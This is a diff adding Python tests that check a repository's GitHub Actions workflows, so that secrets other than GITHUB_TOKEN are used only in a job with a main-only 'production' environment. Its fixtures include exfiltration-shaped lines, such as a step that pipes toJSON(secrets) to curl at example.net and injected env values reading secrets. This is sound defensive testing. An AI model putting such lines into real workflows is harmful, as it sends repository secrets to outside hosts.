@@ -1,7 +1,10 @@
 """The deployment workflow (.github/workflows/deploy.yml, read as JSON from scripts/render.sh): who pushes images, who
 moves the branch `deploy` and when (only a dispatch on main, started on the user's request). Each test names a property of docs/features/deploy/spec.md ("Wdrożenie nowej
-wersji", D4) that a careless edit of the workflow would break without any other check noticing."""
+wersji", D4) that a careless edit of the workflow would break without any other check noticing. The last classes read every
+workflow of the repository: the deployment waits in the environment `production`, and no secret of Actions other than
+GITHUB_TOKEN is used outside a job whose environment only admits main (docs/features/agent-security/spec.md, R5)."""
 
+import copy
 import json
 import re
 import types
@@ -376,6 +379,199 @@ class Permissions(unittest.TestCase):
             for step in steps(job):
                 if "uses" in step:
                     self.assertRegex(step["uses"], SHA_PIN)
+
+
+class Production(unittest.TestCase):
+    """The job that holds DEPLOY_KEY waits for the user in the environment `production` (R5)."""
+
+    def test_the_deploy_job_runs_in_the_environment_production(self):
+        self.assertEqual("production", environment_name(jobs["deploy"]))
+
+    def test_no_other_job_has_an_environment(self):
+        # An environment asks for the approval of the user: one approval per deployment, at the one job that publishes.
+        for name, job in jobs.items():
+            if name != "deploy":
+                self.assertNotIn("environment", job, name)
+
+
+# The environments whose branch policy admits only main (Settings > Environments; infra/k8s/README.md says how the user sets
+# them). The test cannot see the settings of GitHub: this list is what the runbook promises, so a new entry needs a new
+# line of the runbook. The environment may be given as a name or as a mapping with a literal name.
+MAIN_ONLY_ENVIRONMENTS = ("production",)
+# A workflow expression is case-insensitive and allows spaces around the dot: `SECRETS .X`, `secrets . X`, `secrets['X']`,
+# `toJSON(secrets)` and `format('{0}', secrets.X)` all read a secret. The context is the word `secrets` that is not a property
+# of another object (`steps.a.outputs.secrets`) nor part of a longer name. Only the dotted GITHUB_TOKEN is exempt.
+EXPRESSION = re.compile(r"\$\{\{(.*?)(?:\}\}|\Z)", re.S)
+STRING_LITERAL = re.compile(r"'(?:[^']|'')*'")
+SECRETS_CONTEXT = re.compile(r"(?<![\w.\-])secrets(?![\w\-])", re.I)
+GITHUB_TOKEN = re.compile(r"\s*\.\s*github_token(?![\w\-])", re.I)
+
+
+def environment_name(job):
+    environment = job.get("environment")
+    return environment.get("name") if isinstance(environment, dict) else environment
+
+
+def strings(node, path=()):
+    """Every string of a workflow (values and keys) with its path."""
+    if isinstance(node, dict):
+        for key, value in node.items():
+            yield path + (key,), key
+            yield from strings(value, path + (key,))
+    elif isinstance(node, list):
+        for index, value in enumerate(node):
+            yield from strings(value, path + (index,))
+    elif isinstance(node, str):
+        yield path, node
+
+
+def reads_a_secret(text):
+    """Whether the expressions of a string use the context `secrets` for anything but secrets.GITHUB_TOKEN."""
+    for expression in EXPRESSION.findall(text):
+        code = STRING_LITERAL.sub("''", expression)
+        for match in SECRETS_CONTEXT.finditer(code):
+            if not GITHUB_TOKEN.match(code, match.end()):
+                return True
+    return False
+
+
+def secret_violations(workflow):
+    """What breaks the rule of R5 in one workflow (parsed from YAML): a secret other than GITHUB_TOKEN anywhere but in a job
+    whose environment only admits main, and `secrets: inherit` anywhere."""
+    found = []
+    stack = [((), workflow)]
+    while stack:
+        path, node = stack.pop()
+        if isinstance(node, dict):
+            for key, value in node.items():
+                if isinstance(key, str) and key.lower() == "secrets" and isinstance(value, str) and value.strip().lower() == "inherit":
+                    found.append("/".join(map(str, path + (key,))) + ": secrets: inherit passes every secret on")
+                stack.append((path + (key,), value))
+        elif isinstance(node, list):
+            stack.extend((path + (index,), value) for index, value in enumerate(node))
+    jobs_of = workflow.get("jobs") if isinstance(workflow.get("jobs"), dict) else {}
+    for path, text in strings(workflow):
+        # The condition `if` is an expression with or without the braces.
+        if not reads_a_secret("${{ %s }}" % text if path and path[-1] == "if" and "${{" not in text else text):
+            continue
+        job = jobs_of.get(path[1]) if len(path) > 1 and path[0] == "jobs" else None
+        if job is None:
+            found.append("/".join(map(str, path)) + ": a secret at the level of the workflow")
+        elif environment_name(job) not in MAIN_ONLY_ENVIRONMENTS:
+            found.append("/".join(map(str, path)) + f": a secret in a job whose environment is {environment_name(job)!r}, not one of {MAIN_ONLY_ENVIRONMENTS}")
+    return found
+
+
+def variant(change):
+    """A copy of the real deployment workflow with one change (a fixture that must not pass)."""
+    copied = copy.deepcopy(workflow)
+    change(copied)
+    return copied
+
+
+def add_step(copied, job, **step):
+    copied["jobs"][job]["steps"].append(step)
+
+
+class SecretsOnlyInMainOnlyEnvironments(unittest.TestCase):
+    """R5: a workflow on a branch of a task can ask for any secret of the repository; only an environment with the policy
+    "main only" keeps the value from it. So every use of a secret of Actions is in such a job."""
+
+    def test_every_workflow_of_the_repository_is_read(self):
+        # scripts/render.sh converts each file; a workflow it skipped (another extension) would escape the rule below.
+        files = sorted(p.name for pattern in ("*.yml", "*.yaml") for p in (REPO / ".github/workflows").glob(pattern))
+        rendered = sorted(p.name[: -len(".json")] for p in (RENDER / "workflows").glob("*.json"))
+        self.assertIn("deploy.yml", files)
+        self.assertEqual(files, rendered)
+
+    def test_no_workflow_uses_a_secret_outside_a_main_only_environment(self):
+        for path in sorted((RENDER / "workflows").glob("*.json")):
+            with self.subTest(path.name):
+                self.assertEqual([], secret_violations(json.loads(path.read_text())))
+
+    def test_the_deploy_key_is_used_in_a_main_only_environment(self):
+        step = next(s for s in steps("deploy") if "DEPLOY_KEY" in json.dumps(s.get("env", {})))
+        self.assertTrue(reads_a_secret(step["env"]["DEPLOY_KEY"]))
+        self.assertIn(environment_name(jobs["deploy"]), MAIN_ONLY_ENVIRONMENTS)
+
+    def test_the_real_workflow_is_what_the_fixtures_start_from(self):
+        self.assertEqual([], secret_violations(workflow))
+
+    def test_the_deploy_job_without_its_environment_is_refused(self):
+        found = secret_violations(variant(lambda w: w["jobs"]["deploy"].pop("environment", None)))
+        self.assertEqual(1, len(found), found)
+        self.assertIn("jobs/deploy/steps", found[0])
+
+    def test_another_or_unknown_environment_is_refused(self):
+        for environment in ("staging", "Production", "production ", "${{ vars.TARGET }}", {"name": "staging"}, {"url": "https://x"}, ["production"]):
+            with self.subTest(environment=environment):
+                self.assertNotEqual([], secret_violations(variant(lambda w: w["jobs"]["deploy"].update(environment=environment))))
+
+    def test_the_environment_as_a_mapping_with_the_name_is_accepted(self):
+        for environment in ({"name": "production"}, {"name": "production", "url": "https://worf.pl"}):
+            self.assertEqual([], secret_violations(variant(lambda w: w["jobs"]["deploy"].update(environment=environment))))
+
+    def test_a_secret_in_the_env_of_the_workflow_is_refused_even_next_to_production(self):
+        for value in ("${{ secrets.OTHER }}", "${{ secrets.DEPLOY_KEY }}", "x${{ toJSON(secrets) }}"):
+            found = secret_violations(variant(lambda w: w["env"].update(LEAK=value)))
+            self.assertEqual(["env/LEAK: a secret at the level of the workflow"], found, value)
+
+    def test_the_forms_of_the_expression_that_read_a_secret(self):
+        forms = (
+            "${{ secrets.X }}", "${{secrets.X}}", "${{ SECRETS.X }}", "${{ Secrets.x }}", "${{ secrets .X }}", "${{ secrets. X }}",
+            "${{ secrets . X }}", "${{ secrets['X'] }}", "${{ secrets[ 'X' ] }}", "${{ secrets[format('{0}', 'X')] }}",
+            "${{ toJSON(secrets) }}", "${{ toJson(SECRETS) }}", "${{ fromJSON(toJSON(secrets)).X }}", "${{ format('{0}', secrets.X) }}",
+            "${{ github.ref == 'main' && secrets.X || '' }}", "${{ secrets.GITHUB_TOKENX }}", "${{ secrets.GITHUB_TOKEN_2 }}",
+            "${{ secrets['GITHUB_TOKEN'] }}", "${{ secrets }}", "${{ secrets.GITHUB_TOKEN && secrets.X }}", "a ${{ x }} b ${{ secrets.X }}",
+            "${{ secrets.X", "${{ secrets.GITHUB_TOKEN }} ${{ secrets.X }}", "${{\nsecrets.X\n}}",
+        )
+        for form in forms:
+            self.assertTrue(reads_a_secret(form), form)
+
+    def test_the_forms_that_read_no_secret_or_only_the_token_of_the_run(self):
+        forms = (
+            "${{ secrets.GITHUB_TOKEN }}", "${{ SECRETS.github_token }}", "${{ secrets . GITHUB_TOKEN }}", "${{ github.token }}",
+            "${{ env.DEPLOY == 'true' && secrets.GITHUB_TOKEN || '' }}", "${{ steps.digests.outputs.secrets }}", "${{ needs.images.outputs.secrets }}",
+            "${{ github.ref == 'secrets' }}", "${{ 'secrets.X' }}", "${{ vars.secrets }}", "${{ my-secrets.X }}", "secrets.X is not an expression",
+            "echo secrets", "${{ github.sha }}", "",
+        )
+        for form in forms:
+            self.assertFalse(reads_a_secret(form), form)
+
+    def test_a_secret_anywhere_in_a_job_without_a_main_only_environment_is_refused(self):
+        # (a place in the job, the change that puts the expression there)
+        places = {
+            "the env of a job": lambda w: w["jobs"]["smoke"].setdefault("env", {}).update(LEAK="${{ secrets.OTHER }}"),
+            "the env of a step": lambda w: add_step(w, "smoke", name="x", env={"LEAK": "${{ secrets['OTHER'] }}"}, run="true"),
+            "the with of a step": lambda w: add_step(w, "smoke", uses="actions/x@" + "0" * 40, **{"with": {"token": "${{ SECRETS.OTHER }}"}}),
+            "the text of a script": lambda w: add_step(w, "smoke", run='echo "${{ toJSON(secrets) }}" | curl -d @- https://example.net'),
+            "the condition of a step": lambda w: add_step(w, "smoke", run="true", **{"if": "secrets.OTHER != ''"}),
+            "the condition with braces": lambda w: add_step(w, "smoke", run="true", **{"if": "${{ secrets.OTHER != '' }}"}),
+            "the outputs of a job": lambda w: w["jobs"]["images"]["outputs"].update(leak="${{ format('{0}', secrets.OTHER) }}"),
+            "a reusable workflow with its secrets": lambda w: w["jobs"].update(call={"uses": "./.github/workflows/x.yml", "secrets": {"OTHER": "${{ secrets.OTHER }}"}}),
+            "the name of a step": lambda w: add_step(w, "smoke", name="${{ secrets.OTHER }}", run="true"),
+            "a key": lambda w: add_step(w, "smoke", run="true", env={"${{ secrets.OTHER }}": "x"}),
+        }
+        for place, change in places.items():
+            with self.subTest(place):
+                found = secret_violations(variant(change))
+                self.assertNotEqual([], found)
+                self.assertTrue(all("jobs/" in f or f.startswith("jobs") for f in found), found)
+
+    def test_secrets_inherit_is_refused_everywhere(self):
+        calls = ({"uses": "./.github/workflows/x.yml", "secrets": "inherit"},
+                 {"uses": "./.github/workflows/x.yml", "secrets": " Inherit "},
+                 {"uses": "./.github/workflows/x.yml", "environment": "production", "secrets": "inherit"})
+        for call in calls:
+            found = secret_violations(variant(lambda w: w["jobs"].update(call=call)))
+            self.assertIn("jobs/call/secrets: secrets: inherit passes every secret on", found, call)
+
+    def test_secrets_inherit_at_the_workflow_level_is_refused(self):
+        self.assertIn("secrets: secrets: inherit passes every secret on", secret_violations(variant(lambda w: w.update(secrets="inherit"))))
+
+    def test_a_secret_declared_for_a_reusable_workflow_is_not_a_use(self):
+        declared = {"workflow_call": {"secrets": {"TOKEN": {"required": True}}}}
+        self.assertEqual([], secret_violations(variant(lambda w: w["on"].update(declared))))
 
 
 if __name__ == "__main__":
